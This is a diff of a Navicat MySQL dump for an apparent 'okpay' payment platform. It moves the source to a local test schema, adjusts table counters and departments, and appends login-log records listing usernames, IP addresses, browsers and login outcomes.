@@ -1,17 +1,17 @@
 /*
  Navicat Premium Data Transfer
 
- Source Server         : okpay
+ Source Server         : okpay_test
  Source Server Type    : MySQL
- Source Server Version : 50650 (5.6.50-log)
- Source Host           : 43.134.216.222:3306
- Source Schema         : okpay
+ Source Server Version : 50726 (5.7.26)
+ Source Host           : localhost:3306
+ Source Schema         : okpay_test
 
  Target Server Type    : MySQL
- Target Server Version : 50650 (5.6.50-log)
+ Target Server Version : 50726 (5.7.26)
  File Encoding         : 65001
 
- Date: 21/05/2024 23:29:36
+ Date: 08/06/2024 08:01:15
 */
 
 SET NAMES utf8mb4;
@@ -395,7 +395,7 @@ CREATE TABLE `sys_buy_coin`  (
   `update_time` datetime NULL DEFAULT NULL COMMENT '更新时间',
   `remark` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '备注',
   PRIMARY KEY (`buy_id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '买币表' ROW_FORMAT = DYNAMIC;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '买币表' ROW_FORMAT = DYNAMIC;
 
 -- ----------------------------
 -- Records of sys_buy_coin
@@ -414,7 +414,7 @@ CREATE TABLE `sys_chat`  (
   `del_flag` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '0' COMMENT '删除标志（0代表存在 2代表删除）',
   `create_by` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT '创建者',
   PRIMARY KEY (`chat_id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 50 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '聊天信息表' ROW_FORMAT = DYNAMIC;
+) ENGINE = InnoDB AUTO_INCREMENT = 66 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '聊天信息表' ROW_FORMAT = DYNAMIC;
 
 -- ----------------------------
 -- Records of sys_chat
@@ -469,15 +469,18 @@ CREATE TABLE `sys_dept`  (
   `update_by` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT '更新者',
   `update_time` datetime NULL DEFAULT NULL COMMENT '更新时间',
   PRIMARY KEY (`dept_id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 225 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '部门表' ROW_FORMAT = DYNAMIC;
+) ENGINE = InnoDB AUTO_INCREMENT = 228 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '部门表' ROW_FORMAT = DYNAMIC;
 
 -- ----------------------------
 -- Records of sys_dept
 -- ----------------------------
 INSERT INTO `sys_dept` VALUES (100, 0, 2, '0', 'OKPAY平台', 0, '若依', '15888888888', 'ry@qq.com', '0', '0', 'admin', '2024-01-02 21:22:08', '', NULL);
-INSERT INTO `sys_dept` VALUES (216, 100, 7, '0,100', '测试商户1', 0, NULL, NULL, NULL, '0', '0', 'admin', '2024-01-04 23:20:29', 'admin', '2024-03-12 20:33:55');
+INSERT INTO `sys_dept` VALUES (216, 100, 7, '0,100', '商户', 0, NULL, NULL, NULL, '0', '0', 'admin', '2024-01-04 23:20:29', 'okadmin', '2024-06-05 19:34:48');
 INSERT INTO `sys_dept` VALUES (217, 216, 0, '0,100,216', '测试商户1代理', 0, NULL, NULL, NULL, '0', '0', '', '2024-01-04 23:20:29', '', NULL);
 INSERT INTO `sys_dept` VALUES (218, 217, 0, '0,100,216,217', '测试商户1客户', 0, NULL, NULL, NULL, '0', '0', '', '2024-01-04 23:20:29', '', NULL);
+INSERT INTO `sys_dept` VALUES (225, 100, 27, '0,100', 'daren1', 0, NULL, NULL, NULL, '0', '0', 'okadmin', '2024-06-01 17:17:20', 'okadmin', '2024-06-05 19:35:59');
+INSERT INTO `sys_dept` VALUES (226, 225, 0, '0,100,225', 'daren1代理', 0, NULL, NULL, NULL, '0', '0', '', '2024-06-01 17:17:20', '', NULL);
+INSERT INTO `sys_dept` VALUES (227, 226, 0, '0,100,225,226', 'daren1客户', 0, NULL, NULL, NULL, '0', '0', '', '2024-06-01 17:17:20', '', NULL);
 
 -- ----------------------------
 -- Table structure for sys_dict_data
@@ -627,7 +630,7 @@ CREATE TABLE `sys_job`  (
   `update_time` datetime NULL DEFAULT NULL COMMENT '更新时间',
   `remark` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT '备注信息',
   PRIMARY KEY (`job_id`, `job_name`, `job_group`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '定时任务调度表' ROW_FORMAT = DYNAMIC;
+) ENGINE = InnoDB AUTO_INCREMENT = 9 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '定时任务调度表' ROW_FORMAT = DYNAMIC;
 
 -- ----------------------------
 -- Records of sys_job
@@ -673,7 +676,7 @@ CREATE TABLE `sys_logininfor`  (
   PRIMARY KEY (`info_id`) USING BTREE,
   INDEX `idx_sys_logininfor_s`(`status`) USING BTREE,
   INDEX `idx_sys_logininfor_lt`(`login_time`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 402 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '系统访问记录' ROW_FORMAT = DYNAMIC;
+) ENGINE = InnoDB AUTO_INCREMENT = 767 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '系统访问记录' ROW_FORMAT = DYNAMIC;
 
 -- ----------------------------
 -- Records of sys_logininfor
@@ -980,6 +983,371 @@ INSERT INTO `sys_logininfor` VALUES (398, 'okadmin', '182.239.93.139', 'XX XX', 
 INSERT INTO `sys_logininfor` VALUES (399, 'okadmin', '182.239.93.139', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-05-21 23:25:13');
 INSERT INTO `sys_logininfor` VALUES (400, 'okadmin', '182.239.93.139', 'XX XX', 'Chrome 12', 'Windows 10', '0', '退出成功', '2024-05-21 23:25:39');
 INSERT INTO `sys_logininfor` VALUES (401, 'okadmin', '182.239.93.139', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-05-21 23:28:48');
+INSERT INTO `sys_logininfor` VALUES (402, 'okadmin', '182.239.92.186', 'XX XX', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 08:56:03');
+INSERT INTO `sys_logininfor` VALUES (403, 'okadmin', '120.36.248.222', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-05-22 09:43:56');
+INSERT INTO `sys_logininfor` VALUES (404, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 09:52:22');
+INSERT INTO `sys_logininfor` VALUES (405, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-22 09:56:21');
+INSERT INTO `sys_logininfor` VALUES (406, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 09:56:29');
+INSERT INTO `sys_logininfor` VALUES (407, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-22 09:57:28');
+INSERT INTO `sys_logininfor` VALUES (408, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 09:57:33');
+INSERT INTO `sys_logininfor` VALUES (409, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-22 09:58:56');
+INSERT INTO `sys_logininfor` VALUES (410, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 09:59:07');
+INSERT INTO `sys_logininfor` VALUES (411, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-22 09:59:36');
+INSERT INTO `sys_logininfor` VALUES (412, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 09:59:40');
+INSERT INTO `sys_logininfor` VALUES (413, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-22 09:59:54');
+INSERT INTO `sys_logininfor` VALUES (414, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 09:59:58');
+INSERT INTO `sys_logininfor` VALUES (415, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-22 10:00:32');
+INSERT INTO `sys_logininfor` VALUES (416, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 10:00:40');
+INSERT INTO `sys_logininfor` VALUES (417, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-22 10:00:59');
+INSERT INTO `sys_logininfor` VALUES (418, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 10:01:04');
+INSERT INTO `sys_logininfor` VALUES (419, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-22 10:03:39');
+INSERT INTO `sys_logininfor` VALUES (420, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 10:04:49');
+INSERT INTO `sys_logininfor` VALUES (421, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-22 10:06:22');
+INSERT INTO `sys_logininfor` VALUES (422, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 10:06:31');
+INSERT INTO `sys_logininfor` VALUES (423, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-22 10:06:57');
+INSERT INTO `sys_logininfor` VALUES (424, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 10:07:28');
+INSERT INTO `sys_logininfor` VALUES (425, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-22 10:07:37');
+INSERT INTO `sys_logininfor` VALUES (426, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 10:07:45');
+INSERT INTO `sys_logininfor` VALUES (427, 'kehu1', '120.36.248.222', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-05-22 10:34:26');
+INSERT INTO `sys_logininfor` VALUES (428, 'kehu1', '182.239.114.179', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-22 10:37:09');
+INSERT INTO `sys_logininfor` VALUES (429, 'aa147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 10:54:43');
+INSERT INTO `sys_logininfor` VALUES (430, 'aa147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 10:54:55');
+INSERT INTO `sys_logininfor` VALUES (431, 'aa147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 10:55:09');
+INSERT INTO `sys_logininfor` VALUES (432, 'aa147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 10:56:17');
+INSERT INTO `sys_logininfor` VALUES (433, 'WA147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 10:57:54');
+INSERT INTO `sys_logininfor` VALUES (434, 'QW147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 10:58:09');
+INSERT INTO `sys_logininfor` VALUES (435, 'aa147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 10:58:42');
+INSERT INTO `sys_logininfor` VALUES (436, 'aa147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 10:58:49');
+INSERT INTO `sys_logininfor` VALUES (437, 'aa147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 10:58:55');
+INSERT INTO `sys_logininfor` VALUES (438, 'aa147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 10:59:08');
+INSERT INTO `sys_logininfor` VALUES (439, 'QW147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 10:59:51');
+INSERT INTO `sys_logininfor` VALUES (440, 'QW147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 10:59:58');
+INSERT INTO `sys_logininfor` VALUES (441, 'QW147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 11:00:02');
+INSERT INTO `sys_logininfor` VALUES (442, 'QW147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 11:00:15');
+INSERT INTO `sys_logininfor` VALUES (443, 'QW147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 11:00:19');
+INSERT INTO `sys_logininfor` VALUES (444, 'QW147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 11:00:27');
+INSERT INTO `sys_logininfor` VALUES (445, 'QW147258', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-22 11:00:52');
+INSERT INTO `sys_logininfor` VALUES (446, 'kehu2', '127.0.0.1', '内网IP', 'Chrome 12', 'Windows 10', '1', '用户不存在/密码错误', '2024-05-22 19:52:56');
+INSERT INTO `sys_logininfor` VALUES (447, 'kehu1', '127.0.0.1', '内网IP', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-05-22 19:53:00');
+INSERT INTO `sys_logininfor` VALUES (448, 'kehu2', '36.248.233.20', 'XX XX', 'Chrome Mobile', 'Android 1.x', '1', '用户不存在/密码错误', '2024-05-22 19:57:15');
+INSERT INTO `sys_logininfor` VALUES (449, 'kehu2', '36.248.233.20', 'XX XX', 'Chrome Mobile', 'Android 1.x', '1', '用户不存在/密码错误', '2024-05-22 19:57:26');
+INSERT INTO `sys_logininfor` VALUES (450, 'kahu1', '36.248.233.20', 'XX XX', 'Chrome Mobile', 'Android 1.x', '1', '用户不存在/密码错误', '2024-05-22 19:57:42');
+INSERT INTO `sys_logininfor` VALUES (451, 'kehu1', '36.248.233.20', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-05-22 19:57:54');
+INSERT INTO `sys_logininfor` VALUES (452, 'okadmin', '223.104.55.109', 'XX XX', 'Chrome 10', 'Windows 10', '0', '登录成功', '2024-05-23 14:50:57');
+INSERT INTO `sys_logininfor` VALUES (453, 'agent1', '182.239.115.45', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 15:05:05');
+INSERT INTO `sys_logininfor` VALUES (454, 'merchant1', '111.55.137.233', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-05-23 15:08:56');
+INSERT INTO `sys_logininfor` VALUES (455, 'agent1', '182.239.115.45', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 15:23:37');
+INSERT INTO `sys_logininfor` VALUES (456, 'okadmin', '182.239.93.139', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-05-23 18:40:53');
+INSERT INTO `sys_logininfor` VALUES (457, 'merchant1', '182.239.93.139', 'XX XX', 'Unknown', 'Unknown', '0', '登录成功', '2024-05-23 18:42:09');
+INSERT INTO `sys_logininfor` VALUES (458, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 19:32:16');
+INSERT INTO `sys_logininfor` VALUES (459, 'okadmin', '182.239.92.69', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-05-23 19:33:21');
+INSERT INTO `sys_logininfor` VALUES (460, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 19:58:38');
+INSERT INTO `sys_logininfor` VALUES (461, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 19:59:05');
+INSERT INTO `sys_logininfor` VALUES (462, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 19:59:34');
+INSERT INTO `sys_logininfor` VALUES (463, 'admin', '111.201.28.62', 'XX XX', 'Firefox 11', 'Windows 10', '0', '登录成功', '2024-05-23 20:14:12');
+INSERT INTO `sys_logininfor` VALUES (464, 'agent1', '182.239.115.45', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 20:18:31');
+INSERT INTO `sys_logininfor` VALUES (465, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 20:53:55');
+INSERT INTO `sys_logininfor` VALUES (466, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 20:54:11');
+INSERT INTO `sys_logininfor` VALUES (467, '123qwe', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '注册成功', '2024-05-23 20:54:45');
+INSERT INTO `sys_logininfor` VALUES (468, '123qwe', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 20:54:52');
+INSERT INTO `sys_logininfor` VALUES (469, '123qwe', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 20:55:19');
+INSERT INTO `sys_logininfor` VALUES (470, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 20:55:39');
+INSERT INTO `sys_logininfor` VALUES (471, 'admin', '103.172.41.206', 'XX XX', 'Chrome 12', 'Mac OS X', '1', '用户不存在/密码错误', '2024-05-23 21:01:05');
+INSERT INTO `sys_logininfor` VALUES (472, 'root', '103.172.41.206', 'XX XX', 'Chrome 12', 'Mac OS X', '1', '用户不存在/密码错误', '2024-05-23 21:01:14');
+INSERT INTO `sys_logininfor` VALUES (473, 'admin1', '103.172.41.206', 'XX XX', 'Chrome 12', 'Mac OS X', '1', '用户不存在/密码错误', '2024-05-23 21:01:18');
+INSERT INTO `sys_logininfor` VALUES (474, '123qwe', '182.239.92.69', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 21:07:20');
+INSERT INTO `sys_logininfor` VALUES (475, 'sadasd', '103.172.41.206', 'XX XX', 'Chrome 12', 'Mac OS X', '1', '用户不存在/密码错误', '2024-05-23 21:17:54');
+INSERT INTO `sys_logininfor` VALUES (476, '123ewq', '36.248.233.129', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '注册成功', '2024-05-23 21:21:17');
+INSERT INTO `sys_logininfor` VALUES (477, '123ewq', '36.248.233.129', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-05-23 21:21:33');
+INSERT INTO `sys_logininfor` VALUES (478, '123ewq', '36.248.233.129', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '退出成功', '2024-05-23 21:28:02');
+INSERT INTO `sys_logininfor` VALUES (479, '123456qwe', '36.248.233.129', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '注册成功', '2024-05-23 21:29:21');
+INSERT INTO `sys_logininfor` VALUES (480, 'okadmin', '182.239.92.69', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-05-23 21:30:12');
+INSERT INTO `sys_logininfor` VALUES (481, '123qwe', '182.239.92.69', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 21:31:06');
+INSERT INTO `sys_logininfor` VALUES (482, 'zx1122', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '注册成功', '2024-05-23 22:19:45');
+INSERT INTO `sys_logininfor` VALUES (483, 'zx1122', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 22:20:06');
+INSERT INTO `sys_logininfor` VALUES (484, 'zx1122', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 22:23:44');
+INSERT INTO `sys_logininfor` VALUES (485, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 22:31:47');
+INSERT INTO `sys_logininfor` VALUES (486, 'zx1122', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 22:43:46');
+INSERT INTO `sys_logininfor` VALUES (487, 'zx1122', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 22:44:41');
+INSERT INTO `sys_logininfor` VALUES (488, 'zx1122', '182.239.93.90', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 22:46:30');
+INSERT INTO `sys_logininfor` VALUES (489, 'agent1', '182.239.115.234', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 22:47:30');
+INSERT INTO `sys_logininfor` VALUES (490, 'agent1', '182.239.115.234', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 22:48:39');
+INSERT INTO `sys_logininfor` VALUES (491, 'agent1', '182.239.115.234', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 22:49:07');
+INSERT INTO `sys_logininfor` VALUES (492, '123qwe', '182.239.92.69', 'XX XX', 'Apple WebKit', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 22:50:01');
+INSERT INTO `sys_logininfor` VALUES (493, 'okadmin', '182.239.93.90', 'XX XX', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 22:51:31');
+INSERT INTO `sys_logininfor` VALUES (494, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 23:02:25');
+INSERT INTO `sys_logininfor` VALUES (495, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 23:03:20');
+INSERT INTO `sys_logininfor` VALUES (496, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 23:05:10');
+INSERT INTO `sys_logininfor` VALUES (497, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 23:05:41');
+INSERT INTO `sys_logininfor` VALUES (498, 'kehu2', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '1', '用户不存在/密码错误', '2024-05-23 23:05:45');
+INSERT INTO `sys_logininfor` VALUES (499, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 23:05:49');
+INSERT INTO `sys_logininfor` VALUES (500, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 23:06:17');
+INSERT INTO `sys_logininfor` VALUES (501, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 23:06:24');
+INSERT INTO `sys_logininfor` VALUES (502, 'kehu1', '36.248.233.129', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-05-23 23:06:51');
+INSERT INTO `sys_logininfor` VALUES (503, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 23:09:53');
+INSERT INTO `sys_logininfor` VALUES (504, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 23:09:59');
+INSERT INTO `sys_logininfor` VALUES (505, 'agent1', '36.248.233.129', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-05-23 23:10:31');
+INSERT INTO `sys_logininfor` VALUES (506, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 23:15:52');
+INSERT INTO `sys_logininfor` VALUES (507, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 23:15:57');
+INSERT INTO `sys_logininfor` VALUES (508, 'kehu1', '36.248.233.129', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-05-23 23:24:00');
+INSERT INTO `sys_logininfor` VALUES (509, 'kehu1', '36.248.233.129', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '退出成功', '2024-05-23 23:25:59');
+INSERT INTO `sys_logininfor` VALUES (510, 'kehu1', '36.248.233.129', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-05-23 23:26:07');
+INSERT INTO `sys_logininfor` VALUES (511, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 23:27:23');
+INSERT INTO `sys_logininfor` VALUES (512, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 23:27:31');
+INSERT INTO `sys_logininfor` VALUES (513, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 23:27:42');
+INSERT INTO `sys_logininfor` VALUES (514, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 23:27:47');
+INSERT INTO `sys_logininfor` VALUES (515, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 23:28:17');
+INSERT INTO `sys_logininfor` VALUES (516, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 23:28:22');
+INSERT INTO `sys_logininfor` VALUES (517, 'kehu1', '36.248.233.129', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-05-23 23:29:10');
+INSERT INTO `sys_logininfor` VALUES (518, 'kehu1', '36.248.233.129', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-05-23 23:33:13');
+INSERT INTO `sys_logininfor` VALUES (519, 'agent1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 23:34:41');
+INSERT INTO `sys_logininfor` VALUES (520, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-23 23:34:45');
+INSERT INTO `sys_logininfor` VALUES (521, 'agent1', '36.248.233.129', 'XX XX', 'Chrome Mobile', 'Android 1.x', '0', '登录成功', '2024-05-23 23:34:57');
+INSERT INTO `sys_logininfor` VALUES (522, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '退出成功', '2024-05-23 23:48:22');
+INSERT INTO `sys_logininfor` VALUES (523, 'kehu1', '127.0.0.1', '内网IP', 'Mobile Safari', 'Mac OS X (iPhone)', '0', '登录成功', '2024-05-24 00:01:37');
+INSERT INTO `sys_logininfor` VALUES (524, 'merchant1', '182.239.93.139', 'XX XX', 'Unknown', 'Unknown', '0', '登录成功', '2024-05-24 00:05:03');
+INSERT INTO `sys_logininfor` VALUES (525, 'admin', '182.239.93.139', 'XX XX', 'Chrome 12', 'Windows 10', '0', '登录成功', '2024-05-24 00:05:28');
